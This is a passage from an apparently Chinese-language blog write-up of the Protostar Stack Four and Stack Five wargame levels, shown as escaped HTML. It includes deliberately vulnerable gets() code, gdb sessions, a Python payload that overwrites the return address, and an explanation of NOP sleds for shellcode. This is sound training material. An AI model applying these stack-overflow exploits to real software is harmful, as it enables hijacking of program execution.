&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;win&lt;/span&gt;()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;code flow successfully changed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  gets(buffer);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;p&gt;首先 &lt;code&gt;objdump&lt;/code&gt; 找到 &lt;code&gt;void win()&lt;/code&gt; 的地址&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/opt/protostar/bin$ objdump -t /opt/protostar/bin/stack4 | grep win
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;080483f4 g     F .text	&lt;span style=&#34;color:#ae81ff&#34;&gt;00000014&lt;/span&gt;              win
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后，如何知道 &lt;code&gt;main()&lt;/code&gt; 会返回到哪里呢&amp;hellip;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; disassemble main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; main:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x08048408 &amp;lt;main+0&amp;gt;:	push   %ebp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x08048409 &amp;lt;main+1&amp;gt;:	mov    %esp,%ebp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x0804840b &amp;lt;main+3&amp;gt;:	and    $0xfffffff0,%esp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x0804840e &amp;lt;main+6&amp;gt;:	sub    $0x50,%esp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x08048411 &amp;lt;main+9&amp;gt;:	lea    0x10&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%esp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,%eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x08048415 &amp;lt;main+13&amp;gt;:	mov    %eax,&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;%esp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x08048418 &amp;lt;main+16&amp;gt;:	call   0x804830c &amp;lt;gets@plt&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x0804841d &amp;lt;main+21&amp;gt;:	leave  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x0804841e &amp;lt;main+22&amp;gt;:	ret    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;End of assembler dump.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;首先在 &lt;code&gt;0x0804841e &amp;lt;main+22&amp;gt;:	ret&lt;/code&gt; 处设置断点&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; break *0x0804841e
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Breakpoint &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; at 0x804841e: file stack4/stack4.c, line 16.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;为了方便可以写一个字母表&amp;hellip;就大概知道栈溢出到了什么地方..&lt;del&gt;总之就是为了方便x&lt;/del&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ more alb
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行，并查看栈&lt;/p&gt;
&lt;p&gt;这里就 &lt;code&gt;x/24wx $esp&lt;/code&gt; 好了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; run &amp;lt; alb
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting program: /opt/protostar/bin/stack4 &amp;lt; alb
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Breakpoint 1, 0x0804841e in main &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;argc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Cannot access memory at address 0x5353535b
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at stack4/stack4.c:16
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;16	in stack4/stack4.c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; x/24wx $esp 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff79c:	0x54545454	0x55555555	0x56565656	0xbffff800
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff7ac:	0xb7fe1848	0xbffff800	0xffffffff	0xb7ffeff4
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff7bc:	0x0804824b	0x00000001	0xbffff800	0xb7ff0626
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff7cc:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff7dc:	0x00000000	0xbffff818	0xfc365215	0xd6616405
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0xbffff7ec:	0x00000000	0x00000000	0x00000000	0x00000001
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可见现在栈最高处存着 &lt;code&gt;0x54545454&lt;/code&gt;，而这就是 EIP 马上会取的 Return Address&lt;/p&gt;
&lt;p&gt;前进一步看看&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; si
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cannot access memory at address 0x53535357
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; info registers
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;eax            0xbffff750	-1073744048
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ecx            0xbffff750	-1073744048
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;edx            0xb7fd9334	-1208118476
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ebx            0xb7fd7ff4	-1208123404
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;esp            0xbffff7a0	0xbffff7a0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ebp            0x53535353	0x53535353
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;esi            0x0	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;edi            0x0	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;eip            0x54545454	0x54545454
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;eflags         0x200246	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; PF ZF IF ID &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cs             0x73	&lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ss             0x7b	&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ds             0x7b	&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;es             0x7b	&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fs             0x0	&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gs             0x33	&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看来确实是 &lt;code&gt;eip 0x54545454&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;接下来只要把 &lt;code&gt;0x54545454&lt;/code&gt; 改成 &lt;code&gt;void win()&lt;/code&gt; 的地址即可&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ more stack4.py 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;padding &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;win &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\xf4\x83\x04\x08&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;padding + win&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$ python stack4.py | /opt/protostar/bin/stack4
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;code flow successfully changed
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Segmentation fault
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@protostar:/tmp$
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;stack-five&#34;&gt;Stack Five&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Stack5 is a standard buffer overflow, this time introducing shellcode.&lt;/p&gt;
&lt;p&gt;This level is at /opt/protostar/bin/stack5&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hints&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;At this point in time, it might be easier to use someone elses shellcode&lt;/li&gt;
&lt;li&gt;If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger&lt;/li&gt;
&lt;li&gt;remove the int3s once your shellcode is done.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  gets(buffer);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr /&gt;
&lt;p&gt;终于可以开始执行 shellcode 了，好耶w&lt;/p&gt;
&lt;p&gt;首先通过与上题一样的步骤，我们可以改函数的 Return Address&lt;/p&gt;
&lt;p&gt;想执行 shellcode 的简单思路就是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;把 shellcode 写到栈上&lt;/li&gt;
&lt;li&gt;把 Return Address 指向写了 shellcode 的地方&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是，由于环境变量等种种问题，很可能程序每次在栈上的地址都不太一样，&lt;/p&gt;
&lt;p&gt;这种情况可以在 shellcode 前填充大量的 NOP&amp;hellip;这样的话不管 Return Address 指向了哪里，反正只要指向了这一大段冇用的 NOP 的话那么最终就能到达 shellcode&lt;/p&gt;
&lt;p&gt;NOP 的详细定义：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The NOP instruction does nothing. Execution continues with the next instruction. No registers or flags are affected by this instruction. NOP is typically used &lt;strong&gt;to generate a delay in execution or to reserve space in code memory&lt;/strong&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不过说起来，Hints 里提到过：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;来看一下 &lt;code&gt;\xCC (int3)&lt;/code&gt; 的定义：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The INT3 instruction is a one-byte-instruction defined for use by debuggers to temporarily replace an instruction in a running program in order to set a code breakpoint.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;来试一下，首先找个地址来当 Return Address&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; disassemble main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; main:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x080483c4 &amp;lt;main+0&amp;gt;:	push   ebp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x080483c5 &amp;lt;main+1&amp;gt;:	mov    ebp,esp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x080483c7 &amp;lt;main+3&amp;gt;:	and    esp,0xfffffff0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x080483ca &amp;lt;main+6&amp;gt;:	sub    esp,0x50
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x080483cd &amp;lt;main+9&amp;gt;:	lea    eax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;esp+0x10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x080483d1 &amp;lt;main+13&amp;gt;:	mov    DWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;esp&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x080483d4 &amp;lt;main+16&amp;gt;:	call   0x80482e8 &amp;lt;gets@plt&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x080483d9 &amp;lt;main+21&amp;gt;:	leave  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x080483da &amp;lt;main+22&amp;gt;:	ret    
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;End of assembler dump.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; break *0x080483da
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Breakpoint &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; at 0x80483da: file stack5/stack5.c, line 11.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; r
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting program: /opt/protostar/bin/stack5 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Hello
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Breakpoint 1, 0x080483da in main &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;argc&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;134513604, argv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at stack5/stack5.c:11
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;11	stack5/stack5.c: No such file or directory.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	in stack5/stack5.c
